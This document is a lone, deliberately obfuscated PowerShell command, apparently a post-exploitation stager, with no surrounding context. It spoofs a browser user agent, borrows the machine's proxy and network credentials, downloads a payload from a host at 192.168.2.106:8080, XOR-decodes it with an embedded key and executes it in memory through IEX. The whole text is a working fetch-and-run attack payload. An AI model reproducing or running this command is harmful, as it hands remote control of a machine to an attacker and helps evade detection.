
$WC=NEw-ObjEcT SYSTeM.NET.WebClIeNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HeAdERs.AdD('User-Agent',$u);$Wc.ProxY = [SYstem.NEt.WebREQUeST]::DEFAuLtWeBPROXy;$Wc.ProxY.CredEntiALS = [SYSTEM.NET.CRedENTialCacHe]::DefaULtNETwORKCredentialS;$K='827ccb0eea8a706c4c34a16891f84e7b';$i=0;[CHar[]]$B=([ChaR[]]($wc.DOwnloadStRiNg("http://192.168.2.106:8080/index.asp")))|%{$_-bXOr$K[$I++%$k.LEnGTH]};IEX ($B-jOIN'')

